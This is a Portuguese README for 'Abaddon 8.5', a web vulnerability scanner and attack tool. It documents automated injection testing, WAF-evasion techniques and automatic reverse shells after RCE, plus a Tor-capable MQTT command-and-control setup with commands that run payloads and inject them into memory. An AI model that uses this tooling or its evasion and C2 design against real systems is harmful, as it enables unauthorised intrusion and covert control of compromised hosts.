# Abaddon 8.5 - Made By DUKE_BLCK

**AVISO LEGAL:** Esta ferramenta destina-se apenas a fins educacionais e testes de segurança autorizados. O uso não autorizado desta ferramenta contra qualquer sistema é ilegal. O autor não se responsabiliza por qualquer uso indevido.

## Visão Geral

Abaddon é um scanner de segurança web multifuncional projetado para automatizar a descoberta e o teste de vulnerabilidades comuns em aplicações web. Ele integra um crawler, um scanner de parâmetros, um motor de detecção de vulnerabilidades e um sistema de Comando e Controle (C2) baseado em MQTT para operação distribuída.

## Funcionalidades

- **Crawling Inteligente:** Descobre links e endpoints dentro do mesmo domínio alvo.
- **Busca Avançada de Parâmetros:** Utiliza análise de HTML (formulários), JavaScript (fetch, axios) e wordlists para encontrar vetores de injeção.
- **Detecção de Vulnerabilidades:** Testa uma variedade de vulnerabilidades, incluindo:
    - Injeção de SQL (Baseada em erro, tempo e Out-of-Band)
    - Injeção de Comandos (RCE)
    - Cross-Site Scripting (XSS) Refletido
    - Server-Side Template Injection (SSTI)
    - Local File Inclusion (LFI)
- **Técnicas de Evasão:** Utiliza mutação polimórfica de payloads, codificação, headers de bypass (X-Forwarded-For, etc.) e rotação de User-Agent para evitar WAFs e sistemas de detecção.
- **Pós-Exploração:** Tenta estabelecer uma reverse shell para o `LHOST` e `LPORT` configurados após a descoberta de uma RCE.
- **Operação Distribuída (C2):** Permite que múltiplos agentes (`abaddon7.py`) sejam controlados por um servidor central (`c2_server.py`) via MQTT.

## Arquitetura

O projeto é composto por dois componentes principais:

1.  **`abaddon7.py` (Agente):** O cliente que executa os scans. Pode operar em modo autônomo (standalone) ou como um agente conectado a um servidor C2, aguardando comandos.
2.  **`c2_server.py` (Servidor C2):** O servidor de Comando e Controle que gerencia os agentes. Ele pode enviar comandos de scan, listar nós ativos, agregar dados e receber resultados de vulnerabilidades em tempo real.

## Instalação

1.  Clone o repositório:
    ```bash
    git clone <url-do-repositorio>
    cd <diretorio-do-repositorio>
    ```

2.  Instale as dependências Python:
    ```bash
    pip install -r requirements.txt
    ```

3.  (Opcional) Se desejar usar proxies para os scans, crie um arquivo `proxies.txt` no mesmo diretório e adicione seus proxies HTTP, um por linha (ex: `127.0.0.1:8080`).

## Uso

### Modo Autônomo (Standalone)

Para executar um scan simples em um único alvo:

```bash
python3 abaddon7.py example.com
python3 abaddon7.py example.com --lhost SEU_IP --lport SUA_PORTA -v


Modo C2 (Comando e Controle)
Este modo permite orquestrar scans em múltiplos agentes.

1. Inicie o Servidor C2:
Bash
python3 c2_server.py
O servidor se conectará a um broker MQTT público (broker.hivemq.com) e aguardará conexões de agentes.

2. Inicie um ou mais Agentes:
Em máquinas diferentes (ou terminais diferentes), inicie os agentes apontando para o servidor C2.
Bash
python3 abaddon7.py --c2-protocol mqtt --c2-server broker.hivemq.com --c2-port 1883
--c2-protocol: Define o protocolo de comunicação (atualmente mqtt).
--c2-server: Endereço do broker MQTT.
--c2-port: Porta do broker MQTT.
--c2-tor: (Opcional) Roteia a comunicação do agente com o C2 através da rede Tor (requer o serviço Tor rodando localmente na porta 9050).

3. Comandos do Servidor C2:
Uma vez que o servidor C2 esteja rodando, você pode usar os seguintes comandos:
nodes: Lista todos os agentes (nós) online e há quanto tempo foram vistos pela última vez.
Plain Text
C2> nodes
scan <alvo> <node_id|all>: Envia uma tarefa de scan para um agente específico ou para todos os agentes conectados.
Plain Text
C2> scan example.com all
savevulns: Salva todas as vulnerabilidades encontradas por todos os agentes em um arquivo local vulns_<timestamp>.txt.
Plain Text
C2> savevulns
attack <local|kernel> <payload|path>: Executa um payload diretamente no servidor C2.
local: Executa um payload Python inline ou um script a partir de um caminho de arquivo.
kernel: Tenta injetar e executar um payload na memória do servidor C2 usando a syscall memfd_create (requer ambiente Linux).
Plain Text
C2> attack local "import os; os.system('id')"
C2> attack kernel "/bin/bash -c 'echo PoC > /tmp/poc.txt'"
enum all: Agrega todas as URLs, subdomínios e diretórios encontrados por todos os agentes durante os scans e salva a lista consolidada e única em url_enum.txt.
Plain Text
C2> enum all
shutdown <node_id|all>: Envia um comando para desligar um agente específico ou todos os agentes.
Plain Text
C2> shutdown node_1a2b3c4d
help: Mostra a lista de comandos disponíveis.
exit: Encerra o servidor C2.
